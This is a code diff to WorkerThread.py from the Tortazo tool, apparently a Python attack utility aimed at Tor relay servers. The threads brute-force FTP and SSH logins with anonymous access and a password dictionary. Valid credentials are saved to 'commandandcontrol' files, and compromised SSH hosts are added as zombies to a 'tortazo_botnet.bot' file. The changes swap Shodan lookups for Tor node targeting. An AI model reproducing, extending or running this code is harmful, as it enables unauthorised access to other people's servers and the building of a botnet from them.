@@ -1,7 +1,10 @@
 # coding=utf-8
 '''
-Created on 22/01/2013
-@author: Adastra
+Created on 22/01/2014
+
+#Author: Adastra.
+#twitter: @jdaanial
+
 WorkerThread.py
 
 WorkerThread is free software; you can redistribute it and/or modify
@@ -20,7 +23,6 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 import threading
 from stem.util import term
-#from shodan.client import APIError
 import shodan
 import Queue
 import paramiko
@@ -40,45 +42,26 @@ class WorkerThread(threading.Thread):
         #This maps to the function name and port number.
         self.bruteForcePorts ={'ftpBrute':21, 'sshBrute':22, 'telnetBrute':23, 'httpBrute':80, 'snmpBrute':161}
 
-        if self.cli.useShodan == True:
-            #Using Shodan to search information about this machine in shodan database.
-            self.cli.logger.info(term.format("[+] Shodan Activated. About to read the Development Key. ", term.Color.YELLOW))
-            if self.cli.shodanKey == None:
-                #If the key is None, we can't use shodan.
-                self.cli.logger.warn(term.format("[-] Shodan Key's File has not been specified. We can't use shodan without a valid key", term.Color.RED))
-            else:
-                #Read the shodan key and create the WebAPI object.
-                shodanKey = open(self.cli.shodanKey).readline().rstrip('\n')
-                self.shodanApi = shodan.Shodan(shodanKey)
-                self.cli.logger.debug(term.format("[+] Connected to Shodan using Thread: %s " %(self.tid), term.Color.GREEN))
-
     def run(self) :
         lock = threading.Lock()
         while True :
             lock.acquire()
             host = None
             try:
-                values = self.queue.get()
-                self.ip, self.descriptor = values[0]
-                self.ports = values[1]
-
-                if hasattr(self, 'shodanApi'):
-                    self.cli.logger.debug(term.format("[+] Using Shodan against %s " %(self.ip), term.Color.GREEN))
-                    try:
-                        shodanResults = self.shodanApi.host(self.ip)
-                        self.recordShodanResults(self, self.ip, shodanResults)
-                    except APIError:
-                        self.cli.logger.error(term.format("[-] There's no information about %s in the Shodan Database." %(self.ip), term.Color.RED))
-                        pass
+                self.torNode = self.queue.get()
+                #values = self.queue.get()
+                #self.ip, self.descriptor = values[0]
+                #self.ports = values[1]
                 if self.cli.brute is True:
                     #if self.cli.dictFile is not None:
                     for method in self.bruteForcePorts.keys():
-                        if self.bruteForcePorts[method] in self.ports:
-                            #Open port detected for a service supported in the "Brute-Forcer"
-                            #Calling the method using reflection.
-                            containedMethod = getattr(self, method)
-                            if callable(containedMethod):
-                                containedMethod()
+                        for openPort in self.torNode.openPorts:
+                            if self.bruteForcePorts[method] == openPort:
+                                #Open port detected for a service supported in the "Brute-Forcer"
+                                #Calling the method using reflection.
+                                containedMethod = getattr(self, method)
+                                if callable(containedMethod):
+                                    containedMethod()
                     #else:
                     #    self.cli.logger.warn(term.format("[-] BruteForce mode specified but there's no files for users and passwords. Use -f option", term.Color.RED))
             except Queue.Empty :
@@ -91,24 +74,24 @@ class WorkerThread(threading.Thread):
     def ftpBrute(self):
         self.cli.logger.debug(term.format("[+] Starting FTP BruteForce mode on Thread: %d "%self.tid, term.Color.GREEN))
         ftpFileName = 'commandandcontrolftp.txt'
-        self.cli.logger.debug(term.format("[+] Trying Anonymous access in: %s "%(self.ip), term.Color.GREEN))
+        self.cli.logger.debug(term.format("[+] Trying Anonymous access in: %s "%(self.torNode.host), term.Color.GREEN))
         try:
-            ftpClient = ftplib.FTP(self.ip)
+            ftpClient = ftplib.FTP(self.torNode.host)
             ftpClient.login()
-            self.cli.logger.debug(term.format("[+] Anonymous access allowed in: %s "%(self.ip), term.Color.GREEN))
+            self.cli.logger.debug(term.format("[+] Anonymous access allowed in: %s "%(self.torNode.host), term.Color.GREEN))
             ftpFile = open(ftpFileName, 'a')
-            entry = '%s:%s:%s' %(self.ip, 'anonymous', 'anonymous')
+            entry = '%s:%s:%s' %(self.torNode.host, 'anonymous', 'anonymous')
             ftpFile.write(entry+'\n')
             ftpFile.close()
         except:
-            self.cli.logger.debug(term.format("[-] Anonymous access is not allowed in: %s "%(self.ip), term.Color.GREEN))
+            self.cli.logger.debug(term.format("[-] Anonymous access is not allowed in: %s "%(self.torNode.host), term.Color.GREEN))
 
         if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
             self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.dictFile), term.Color.GREEN))
             for line in open(self.cli.dictFile, "r").readlines():
                 [user, passwd] = line.strip().split()
                 try :
-                    ftpClient = ftplib.FTP(self.ip)
+                    ftpClient = ftplib.FTP(self.torNode.host)
                     ftpClient.login(user, passwd)
                 except:
                     continue
@@ -116,7 +99,7 @@ class WorkerThread(threading.Thread):
                     self.cli.logger.info(term.format("[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd), term.Color.YELLOW))
                     ftpClient.quit()
                     ftpFile = open(ftpFileName, 'a')
-                    entry =  '%s:%s:%s' %(self.ip, user, passwd)
+                    entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
                     ftpFile.write(entry+'\n')
                     ftpFile.close()
                     ftpClient.close()
@@ -180,18 +163,21 @@ class WorkerThread(threading.Thread):
 
 
     def performSSHConnection(self, user, passwd):
+        '''
+        Perform SSH Connections using the tortazo_botnet.bot file.
+        '''
         tortazoFile = 'tortazo_botnet.bot'
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         sshFileName = 'commandandcontrolssh.txt'
         try:
-            client.connect(self.ip, username=user, password=passwd)
+            client.connect(self.torNode.host, username=user, password=passwd)
         except paramiko.AuthenticationException:
             return False
         self.cli.logger.info(term.format("[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd), term.Color.YELLOW))
         client.close()
         sshFile = open(sshFileName, 'a')
-        entry =  '%s:%s:%s' %(self.ip, user, passwd)
+        entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
         sshFile.write(entry+'\n')
         sshFile.close()
         self.cli.logger.debug(term.format("[+] Updating the file 'tortazo_botnet.bot' with the new Zombie", term.Color.GREEN))
@@ -203,9 +189,9 @@ class WorkerThread(threading.Thread):
 
         #host:user:pass:port:nickname
         nickname = '--'
-        if self.descriptor:
-            nickname = self.descriptor.nickname
-        entryBotnet = '%s:%s:%s:%s:%s' %(self.ip, user, passwd, '22', nickname)
+        if self.torNode.nickName:
+            nickname = self.torNode.nickName
+        entryBotnet = '%s:%s:%s:%s:%s' %(self.torNode.host, user, passwd, '22', nickname)
         content = open(tortazoFile, 'r').readlines()
         if entryBotnet in content:
             self.cli.logger.debug(term.format("[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file", term.Color.GREEN))
@@ -273,25 +259,3 @@ class WorkerThread(threading.Thread):
             passwords.append(wealsauce)
 
         return passwords
-
-    def recordShodanResults(self, host, results):
-        entryFile = 'shodanScan-%s.txt' %(host)
-        shodanFileResults = open(entryFile, 'a')
-        entry = '------- SHODAN REPORT START FOR %s ------- \n' %(host)
-        self.recursiveInfo(entry, results)
-        entry += '------- SHODAN REPORT END FOR %s ------- \n' %(host)
-        shodanFileResults.write(entry)
-        shodanFileResults.close()
-        self.cli.logger.debug("[+] Shodan File Created.")
-
-    def recursiveInfo(self, entry, data):
-        if type(data) == dict:
-            for key in self.results.keys():
-                if type(key) == dict:
-                    entry += self.recursiveInfo(entry, key)
-                elif type(key) == list:
-                    for element in key:
-                        if type(key) == dict:
-                            entry += self.recursiveInfo(entry, key)
-                else:
-                    entry += '[+]%s : %s \n' %(key, self.results[key])
